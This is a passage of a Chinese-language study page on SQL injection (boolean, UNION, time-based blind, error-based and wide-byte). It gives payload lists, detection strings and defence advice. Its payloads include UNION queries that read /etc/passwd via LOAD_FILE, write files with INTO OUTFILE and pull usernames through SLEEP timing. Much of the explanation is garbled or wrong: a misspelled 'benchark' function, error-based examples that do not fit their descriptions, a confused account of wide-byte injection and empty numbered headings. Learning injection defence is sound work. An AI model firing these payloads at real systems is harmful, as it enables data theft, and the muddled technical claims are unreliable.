title="布尔注入"></a>布尔注入</h5><p>SQL布尔注入是一种SQL注入攻击,攻击者利用Where子句中的条件表达式来实现注入。</p><p>举个例子:</p><p>假设有一个查询用户名和密码的SQL语句:</p><p><code>SELECT * FROM users WHERE name = &#39;user&#39; AND password = &#39;pass&#39;;</code></p><p>如果用户输入的用户名为’or’1’&#x3D;’,最终的SQL语句变为:</p><p><code>SELECT * FROM users WHERE name = &#39;or&#39;1&#39;=&#39; AND password = &#39;pass&#39;;</code></p><p>‘or 1&#x3D;’ 的条件永远为true,因此会返回所有用户。</p><p>这就是SQL布尔注入的基本原理,攻击者利用<code>OR</code>、<code>AND</code>、<code>&gt;</code>、<code>&lt;</code>等布尔运算符和比较运算符构造条件,让查询总是为true,从而获取数据。</p><p>举个更复杂的例子:</p><p><code>SELECT * FROM users WHERE id &lt;= &#39;(select id from users limit 0,1)&#39;;</code></p><p>通过此语句,攻击者可以获取users表中的第一个用户的id。</p><p>常见的SQL布尔注入 payload有:</p><ul><li><code>OR 1=1</code></li><li><code>OR 1&gt;0</code> </li><li><code>OR &#39;a&#39;=&#39;a</code></li><li><code>(select * from users) limit 1,1</code></li></ul><p>总的来说,SQL布尔注入利用where子句中的条件表达式来实现注入,获取数据。防范的方法主要是正确过滤和验证输入,使用prepared statements。</p></li><li><h5 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h5><p>SQL联合查询注入是 attackers 通过利用网站的 SQL UNION 语句来实施 SQL 注入攻击的一种方法。</p><p>举个例子:</p><p>假设有一条查询用户信息的 SQL 语句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$user&#x27;</span>;</span><br></pre></td></tr></table></figure><p>通过 UNION,攻击者可以将自己的查询添加上去:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=1 UNION SELECT column1, column2 FROM table--</span></span><br></pre></td></tr></table></figure><p>最终变为:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> <span class="keyword">table</span><span class="comment">--&#x27; ;</span></span><br></pre></td></tr></table></figure><p>这会将攻击者的查询结果联接到原始查询的结果后面。</p><p>通过这种方式,攻击者可以获取数据库中的敏感信息。</p><p>一个更完整的例子:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=1 UNION SELECT 1,user(),3 -- &#x27;</span> </span><br></pre></td></tr></table></figure><p>会返回数据库用户名,攻击者就可以获悉数据库的登录凭证。</p><p>防范方法主要是:</p><ul><li>不允许 UNION 关键字</li><li>限制 SELECT 的列数</li><li>过滤特殊字符</li><li>使用 Prepared Statements</li></ul><p>总的来说,SQL 联合查询注入通过利用 UNION 语句联接攻击者自定义的查询,从而实现数据获取。正确处理用户输入和使用参数化查询是防范的关键。</p><p>希望能给大家一个SQL注入的全面了解。</p><h6 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h6><p>最常见的SQL联合查询注入payload有:</p><p>1.简单获取一列数据</p><p><code>&#39; UNION SELECT column FROM table</code></p><p>2.获取当前数据库名称</p><p><code>&#39; UNION SELECT database()</code></p><p>3.获取当前用户名</p><p><code>&#39; UNION SELECT user()</code></p><p>4.获取所有表名称</p><p><code>&#39; UNION SELECT table_name FROM information_schema.tables</code></p><p>5.获取某个特定表的所有列名</p><p><code>&#39; UNION SELECT column_name FROM information_schema.columns WHERE table_name = &#39;table_name&#39;</code></p><p>6.获取整张表的数据</p><p><code>&#39; UNION SELECT * FROM table</code></p><p>7.利用LOAD_FILE获取文件内容</p><p><code>&#39; UNION SELECT LOAD_FILE(&#39;/etc/passwd&#39;)</code></p><p>8.执行操作语句</p><p><code>&#39; UNION SELECT 1,(SELECT &#39;&lt;sql操作&gt;&#39; FROM DUAL),3--</code></p><p>9.利用判断表达式执行操作</p><p><code>&#39; UNION SELECT 1 WHERE &#39;&lt;sql操作&gt;&#39;</code></p><p>10.利用定时任务执行操作</p><p><code>&#39; UNION SELECT 1,(SELECT &#39;&lt;sql操作&gt;&#39; FROM DUAL),3 INTO OUTFILE &#39;/tmp/xxx.sql&#39; -- </code></p><p>以上这些都是常见的SQL联合查询注入payload。</p><p>主要还是通过<code>UNION</code>关键字联接攻击者的查询语句,获取数据库敏感信息或执行恶意操作。</p><p>防范方法主要是过滤<code>UNION</code>关键字、限制<code>SELECT</code>列数、过滤特殊字符以及使用参数化查询。</p><p>希望能为大家提供参考!如果还有其他有价值的payload,欢迎指正。</p></li><li><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>SQL时间盲注注入是一种通过分析数据库响应时间的差异来获取数据的注入技术。</p><p>举个例子:</p><p>假设有一个查询密码的SQL语句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span>MD5(<span class="string">&#x27;123456&#x27;</span>)</span><br></pre></td></tr></table></figure><p>正常情况下,数据库会很快返回结果。</p><p>利用时间盲注,攻击者可以构造如下查询:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">AND</span> password <span class="keyword">LIKE</span> MD5(concat(<span class="string">&#x27;1234&#x27;</span>,<span class="built_in">substring</span>(passwordtext,<span class="number">1</span>,<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><p>这里会根据实际密码的第一个字符来执行MD5哈希,数据库需要很长时间才能返回结果。</p><p>攻击者可以先猜a - z,如果响应快则密码第一个字符不在这26个字母内。</p><p>然后继续猜其他字符,最终能逐渐获取完整密码。</p><p>通过不断缩小猜测范围,分析响应时间的差异来获取数据。</p><p>另一个例子:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">&lt;=</span><span class="number">1</span> <span class="keyword">AND</span> id<span class="operator">&gt;=</span><span class="number">1</span> </span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">&lt;=</span>(<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>,<span class="number">1</span>) <span class="keyword">AND</span> id<span class="operator">&gt;=</span>(<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>前者数据库会很快返回,后者需要更长时间执行子查询。</p><p>通过getTime的差异判断是否执行了子查询,最终获取数据。</p><p>总的来说,时间盲注通过构造有条件的 SQL 语句,分析数据库执行时间的差异来逐渐获取信息。</p><p>常见的防御措施包括:固定响应时间、过滤输入、记录恶意请求等。</p><h6 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h6><p>最常见的SQL时间盲注payload有:</p><ol><li>获取数据库版本</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> benchark(<span class="number">1000000</span>,SHA1(RAND())))<span class="operator">&gt;</span>(<span class="keyword">SELECT</span> benchark(<span class="number">1000000</span>,SHA1(RAND())))</span><br></pre></td></tr></table></figure><p>时间差异可知数据库版本。</p><ol start="2"><li>获取表名</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> SLEEP(<span class="number">5</span>))VOIUQD <span class="keyword">join</span> (<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables)xZ limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>存在表则耗时5秒,不存在则快。</p><ol start="3"><li>获取列名</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> SLEEP(<span class="number">5</span>)) kJztgi <span class="keyword">join</span> (<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) fym limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>同上,存在列名则耗时5秒。</p><ol start="4"><li>获取数据</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> SLEEP(<span class="number">5</span>)) <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> username <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>)rAxG limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>获取 users 表第一个用户的 username 。</p><ol start="5"><li>执行操作</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> SLEEP(<span class="number">5</span>))Cu <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;&lt;sql操作语句&gt;&#x27;</span>)ihh limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>执行leep为5秒的操作,检测时间差异。</p><p>…</p><p>总的来说,SQL时间盲注payload主要通过构造有条件的SQL语句,分析数据库执行时间差异去盲注 databases 中的数据。</p><p>通过不断缩小查询范围,最终获取期望结果。</p><p>防御方法是固定响应时间、过滤所有输入、监控恶意请求等。 希望能为大家提供参考!</p></li><li><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>报错注入是一种SQL注入技术。当数据库因为特殊的SQL语句产生错误时,通过分析数据库返回的错误信息,来获取隐藏的数据。</p><p>报错注入的工作原理:</p><ol><li><p>攻击者构造一个会产生数据库错误的SQL语句。</p></li><li><p>数据库正确处理时不会有响应,产生错误后会返回详细的错误信息。</p></li><li><p>通过分析错误信息,猜测数据库结构和数据。</p></li><li><p>逐渐获取更多的数据。</p></li></ol><p>举个例子:</p><p>一个查询用户名和密码的SQL语句可能是:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure><p>攻击者可以构造如下产生错误的语句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">AND</span> password <span class="operator">!=</span> <span class="string">&#x27;123&#x27;</span> <span class="keyword">AND</span> ASCII(<span class="built_in">SUBSTRING</span>(password,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">97</span></span><br></pre></td></tr></table></figure><p>这里判断第一个字符的ASCII为97,如果错误,数据库会返回错误信息,可能包含密码第一个字符不符合条件。</p><p>然后攻击者继续构造其它产生错误的语句,逐渐获取完整密码。</p><p>总的来说,报错注入通过分析数据库返回的错误信息,来获取隐藏的数据。</p><p>防范方法主要是:</p><ul><li>隐藏数据库真实错误信息</li><li>只返回固定的custom错误</li><li>过滤所有用户输入,使用参数化查询</li></ul><p>希望为大家带来新视角!如有不确切,欢迎指正。</p><p>报错注入是一种利用数据库错误信息来获取数据库信息的SQL注入攻击方式。</p><p>常见的数据库内置函数有:</p><ol><li>VERSION():用于获取数据库的版本号。例如:</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> VERSION()</span><br></pre></td></tr></table></figure><ol start="2"><li>DATABASE():用于获取当前数据库名。例如:</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE()</span><br></pre></td></tr></table></figure><ol start="3"><li>USER():用于获取当前用户名。例如:</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>()</span><br></pre></td></tr></table></figure><ol start="4"><li>TABLE_NAME():用于获取当前操作的表名。例如:</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TABLE_NAME </span><br><span class="line"><span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS</span><br><span class="line"><span class="keyword">WHERE</span> COLUMN_NAME <span class="operator">=</span> <span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure><p>攻击者可以通过观察数据库返回的错误信息,判断这些函数是否存在,进而获取更多数据库信息。</p><p>除此之外,常用的字符串函数也可以用于报错注入,例如:</p><ol start="5"><li>CHAR():用于将 ASCII 码转换为相应的字符。例如:</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="type">CHAR</span>( hdfsgdhsjfhdgs, <span class="number">114</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">116</span> )</span><br></pre></td></tr></table></figure><ol start="6"><li>CONCAT():用于连接多个字符串。例如:</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> CONCAT( <span class="string">&#x27;user=&#x27;</span>, <span class="keyword">USER</span>(), <span class="string">&#x27;;pwd=&#x27;</span>, rootpassword ) </span><br><span class="line"><span class="keyword">FROM</span> dual</span><br></pre></td></tr></table></figure><p>总的来说,数据库内置函数是报错注入重要的工具,通过这些函数执行,再结合观察错误信息,攻击者就可以劫持数据库。</p><p>抵御报错注入的最好方式是:</p><ul><li>避免输出详细的数据库错误信息</li><li>及时修补数据库漏洞</li><li>采用参数化查询技术防止SQL注入</li></ul><h6 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h6><p>最常见的SQL报错注入payload有:</p><ol><li>获取表名</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables </span></span><br></pre></td></tr></table></figure><p>当有表存在时会返回表名,无表返回错误。</p><ol start="2"><li>获取列名</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>同上,存在列返回列名,否则返回错误。</p><ol start="3"><li>获取数据</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,group_concat(username) from users</span></span><br></pre></td></tr></table></figure><p>返回表内所有username。</p><ol start="4"><li>执行操作语句</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,&#x27;</span><span class="operator">&lt;</span><span class="keyword">sql</span>操作语句<span class="operator">&gt;</span><span class="string">&#x27;,3  </span></span><br></pre></td></tr></table></figure><p>当操作合法时数据库正常,错误时返回错误信息</p><ol start="5"><li>利用 time 语句延迟响应</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,if(1&gt;2,sleep(5),null)  </span></span><br></pre></td></tr></table></figure><p>正确查询快,错误则耗时5秒。</p><ol start="6"><li>使用 INTO OUTFILE 写文件</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,(&#x27;</span><span class="operator">&lt;</span><span class="keyword">sql</span>语句<span class="operator">&gt;</span><span class="string">&#x27;) into outfile &#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span>xx.sql<span class="string">&#x27; </span></span><br></pre></td></tr></table></figure><p>写入文件语句,错误时返回错误信息。</p><ol start="7"><li>使用 LOAD_FILE 读取文件</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,load_file(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;) </span></span><br></pre></td></tr></table></figure><p>读取文件内容,错误时返回错误。</p><ol start="8"><li>利用通配符爆破列名</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,column1 from users where column1 like &#x27;</span>a<span class="operator">%</span><span class="string">&#x27;  </span></span><br></pre></td></tr></table></figure><p>逐个猜测,正确则返回列名,错误则继续下一轮。</p><p>…</p><p>总的来说,报错注入payload主要利用数据库在处理特殊语句时返回的错误信息,分析并构造更多语句获取数据库中利益的数据。</p><p>防御报错注入的方法是:隐藏真实错误信息,只返回自定义错误,以及过滤所有用户输入。</p></li><li><h5 id="2"><a href="#2" class="headerlink" title="2"></a>2</h5></li><li><h5 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h5></li><li><h5 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h5></li><li><h5 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h5></li><li><h5 id="2-4"><a href="#2-4" class="headerlink" title="2"></a>2</h5></li><li><h5 id=""><a href="#" class="headerlink" title=""></a></h5></li></ol><h4 id="二、检测"><a href="#二、检测" class="headerlink" title="二、检测"></a>二、检测</h4><p>常见的SQL注入漏洞检测PAYLOAD有:</p><ol><li><h5 id="字符注入-1"><a href="#字符注入-1" class="headerlink" title="字符注入:"></a>字符注入:</h5></li></ol><ul><li>‘ 或者 “</li><li>‘ or ‘1’&#x3D;’1</li><li>a’or’a’like&#x3D;a’</li><li>‘ or 1&#x3D;1 –</li><li>union select 1,2,3</li></ul><ol start="2"><li><h5 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入:"></a>联合查询注入:</h5></li></ol><ul><li>union select 1,2,3</li><li>union select table_name from information_schema.tables  </li><li>union select column_name from information_schema.columns</li></ul><ol start="3"><li><h5 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入:"></a>布尔型注入:</h5></li></ol><ul><li>and 1&#x3D;1</li><li>or 1&#x3D;1</li><li>&amp;&amp; 1&#x3D;&#x3D;1</li></ul><ol start="4"><li><h5 id="错误注入"><a href="#错误注入" class="headerlink" title="错误注入:"></a>错误注入:</h5></li></ol><ul><li>select * from table mame where id&#x3D;’ 触发语法错误</li></ul><ol start="5"><li><h5 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注:"></a>时间盲注:</h5></li></ol><ul><li>and sleep(5) </li><li>and benchmark(1000000,MD5(“password”))</li></ul><ol start="6"><li><h5 id="报表注入"><a href="#报表注入" class="headerlink" title="报表注入:"></a>报表注入:</h5></li></ol><p>针对数据库报表服务进行注入。</p><ol start="7"><li><h5 id="函数注入"><a href="#函数注入" class="headerlink" title="函数注入:"></a>函数注入:</h5></li></ol><p> exploiting flaws in database functions</p><ol start="8"><li><h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入:"></a>堆叠注入:</h5></li></ol><p>在一个SQL语句中注入多个SQL语句,当服务器执行这个SQL语句时,将会连续执行这多个SQL语句。</p><ol start="9"><li><h5 id="函数注入-1"><a href="#函数注入-1" class="headerlink" title="函数注入:"></a>函数注入:</h5></li></ol><p> exploiting flaws in database functions</p><ol start="10"><li><h5 id="宽字节注入-1"><a href="#宽字节注入-1" class="headerlink" title="宽字节注入:"></a>宽字节注入:</h5></li><li><p>给出一些常见的宽字节注入payload:</p><ol><li>单引号:\u0027</li><li>双引号:\u0022 </li><li>百分号:% </li><li>And 关键字: \u0026</li><li>Or 关键字: \u007C</li><li>ASCII码转换:\u0028 \u0041\u0029</li></ol><p>举个例子,一个简单的payload可以是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u0027\u007C\u0031\u003D\u0031</span><br></pre></td></tr></table></figure><p>解码后的ASCII为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;|1=1</span><br></pre></td></tr></table></figure><p>等价于常规SQL注入payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;|1=1</span><br></pre></td></tr></table></figure><p>更高级的payload可以是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u0027\u007C\u0031\u003D\u0031#\u002D\u002D</span><br></pre></td></tr></table></figure><p>解码为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;|1=1#--</span><br></pre></td></tr></table></figure><p>等价于:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;|1=1#--</span><br></pre></td></tr></table></figure><p>这些payload可以作为宽字节注入的基本模板,然后结合具体的网站测试。</p><p>一般的测试步骤是:</p><ol><li>普通的SQL注入兼容测试</li><li>使用\u002E 测试多个数据库</li><li>使用\u005B\u0031\u005D 测试表</li><li>使用\u0028\u0031 迭代测试字段</li><li>使用\u0028\u0043\u0048\u0041\u0052\u0028 字符串连接来获取数据</li></ol><p>以此类推,测试不同的数据库函数来搜集数据库信息。</p><p>希望这些例子能为你测试宽字节注入提供参考!</p></li><li></li><li></li><li></li></ol><p>这些PAYLOAD主要从以下几个方面检测SQL注入:</p><ol><li><p>对于简单注入检测,使用字符注入PAYLOAD即可。 </p></li><li><p>联合查询PAYLOAD可以试探数据库表名和字段名。</p></li><li><p>布尔PAYLOAD可以确定数据库版本。</p></li><li><p>时间盲注可以逐渐收集数据。</p></li><li><p>错误注入可以查看报错信息。</p></li></ol><p>总的来说,注入PAYLOAD的形式多种多样,从简单到复杂应有尽有。常见的PAYLOAD主要利用SQL语句中的逻辑漏洞进行检测。</p><p>当然,在没有授权的情况下,不要随意对第三方系统进行SQL注入测试。</p><h5 id="防御布尔注入"><a href="#防御布尔注入" class="headerlink" title="防御布尔注入"></a>防御布尔注入</h5><p>是一种SQL注入攻击,攻击者通过构造条件表达式来获取敏感信息。</p><p>防范布尔注入主要有以下几个方法:</p><ol><li>对所有用户输入进行严格的过滤和清理。</li></ol><p>• 删除关键字如and、or 、&#x3D;、&gt; 等<br>• 只保留数字、字母和部分符号</p><ol start="2"><li>使用参数化查询或 prepared statements。</li></ol><p>• 绑定参数,而不是将用户输入直接嵌入 SQL 语句中<br>• 避免使用拼接的方式构造 SQL 语句</p><ol start="3"><li>对于高危输入,限制允许的数据类型。</li></ol><p>• 只允许数字类型的输入,避免字符串<br>• 对字符串输入限制最大长度</p><ol start="4"><li>注意SQL中使用的函数。</li></ol><p>• 一些数据库函数存在安全漏洞,可以利用<br>• 避免在where条件中使用逻辑函数</p><ol start="5"><li>限制error messages。</li></ol><p>• 避免将详细的错误信息返回给用户<br>• 对于SQL语句相关的错误进行隐藏</p><ol start="6"><li>禁用非必需的SQL功能。</li></ol><p>• 对可能存在安全漏洞的功能如存储过程等进行限制</p><ol start="7"><li>及时修复任何已知的SQL注入漏洞。</li></ol><p>防范布尔注入需要全方位的方式:<br>• 应用程序需要严格验证所有输入<br>• 数据库参数需要使用安全方式<br>• 及时检测和修复存在的漏洞</p><p>总的来说,通过合理的用户输入过滤、参数化查询以及错误信息减少,能有效阻止大部分布尔注入攻击。</p><p>希望这些防范方法能为你提供参考!如有疑问,欢迎随时提问。</p><h5 id="防范SQL联合查询注入"><a href="#防范SQL联合查询注入" class="headerlink" title="防范SQL联合查询注入"></a>防范SQL联合查询注入</h5><p>主要有以下几个方法:</p><ol><li>对所有用户输入进行严格的过滤和清理。</li></ol><p>特别是删除union关键字以及其它关键SQL词语。</p><ol start="2"><li>使用参数化查询或 Prepared Statements。</li></ol><p>不要将用户输入直接嵌入 SQL 语句中,而是使用参数。</p><ol start="3"><li>对列数和数据类型进行限制。</li></ol><p>指定用户可查询的字段个数和类型,避免非法字段。</p><ol start="4"><li>适当增加查询时间。</li></ol><p>使联合查询语句执行时间超过用户可接受的限度。</p><ol start="5"><li>禁用非必需的SQL功能。</li></ol><p>如可,可禁用union queries等高级SQL功能。</p><ol start="6"><li>限制 error messages。</li></ol><p>避免将详细的SQL错误返回给用户。</p><ol start="7"><li>及时修复任何已知的SQL注入漏洞。</li></ol><p>综上,防范SQL注入联合查询需要:</p><p>✔︎ 对所有用户输入进行严格的过滤和验证</p><p>✔︎ 使用参数化查询,绑定参数,避免SQL拼接</p><p>✔︎ 限制客户端可查询的字段和结果列数</p><p>✔︎ 隐藏错误细节,不返回有用的信息</p><p>✔︎ 通过安全编码和配置优化系统安全性</p><p>✔︎ 及时测试和修复已知的联合查询漏洞</p><p>主要是通过两方面来实现:</p><ol><li><p>应用层做严格的输入验证、清理和安全编码</p></li><li><p>数据库层增加限制,减少攻击面</p></li></ol><p>当然,采取多重防御机制效果会更佳。</p><p>希望这些方法可以帮助你更好地防范联合查询注入攻击。如有任何疑问,欢迎随时提问。</p><h5 id="防御时间盲注"><a href="#防御时间盲注" class="headerlink" title="防御时间盲注"></a>防御时间盲注</h5><p>主要的方法是:</p><ol><li>对查询参数进行严格的过滤和验证</li></ol><p>要清除所有数据库关键字和特殊字符,只允许数字、字母和有限字符。</p><ol start="2"><li>使用参数化查询语句,绑定查询参数</li></ol><p>避免在SQL语句中直接使用非白名单字符,确保参数安全。</p><ol start="3"><li>为每个SQL查询设置执行时间限制</li></ol><p>一旦超过阈值,则放弃执行该查询,减慢时间盲注攻击速度。</p><ol start="4"><li>通过数据库配置限制结果集和返回记录</li></ol><p>设置合理的限制,阻止攻击者逐步提取大量记录。</p><ol start="5"><li>关闭不必要的数据库功能</li></ol><p>如延迟函数、存储过程等,如果可操作的话。</p><ol start="6"><li>及时修复数据库和应用程序的安全漏洞</li></ol><p>包括已知的时间盲注漏洞。</p><p>具体来说:</p><ul><li>对函数benchmark()或sleep()等进行限制。</li><li>配置更短的超时时间,减慢时间盲注速度。</li><li>通过参数化查询的方式,确保参数安全。</li><li>及时修复time_stamp()函数等存在漏洞的函数。</li></ul><p>总的来说,要有效防范时间盲注,需要:</p><p>✅ 严格过滤所有查询输入<br>✅ 使用参数化查询绑定查询参数<br>✅ 设置每个查询的执行时间限制<br>✅ 通过数据库配置限制查询结果条目<br>✅ 关闭不必要的数据库功能<br>✅ 及时修复数据库和应用程序的漏洞</p><p>从应用程序安全编码开始,到数据库安全配置,再到系统安全周期管理,需要全方位的防御手段共同协作,才能最大限度抵御时间盲注攻击。</p><p>希望这能为你提供如何防范时间盲注的参考。如果仍有疑问,欢迎继续提问。</p><p>参数化查询(Parameterized Query)是一种SQL注入的最佳防御方法。</p><p>它的工作原理是:</p><p>• 不直接将用户的输入嵌入到SQL语句中</p><p>• 而是将用户输入作为参数,使用参数名在SQL语句中引用</p><p>• 在执行SQL前,数据库会对这些参数进行校验和清理</p><p>这样的好处是:</p><p>• 